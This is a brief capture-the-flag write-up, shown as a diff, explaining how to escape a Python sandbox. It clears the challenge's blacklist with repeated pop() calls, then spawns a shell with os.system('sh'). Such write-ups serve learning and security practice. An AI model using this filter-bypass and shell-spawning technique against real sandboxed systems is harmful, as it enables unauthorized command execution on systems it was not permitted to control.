@@ -1,0 +1,8 @@
+To solve this challenge, you have to enter two lines of python code. For your first line you can use
+[blacklist.pop() for i in range(len(blacklist))]
+to get rid of everything in the blacklist.
+
+Then do a simple import os and os.system("sh") -
+import os;os.system('sh')
+
+Then the system is yours
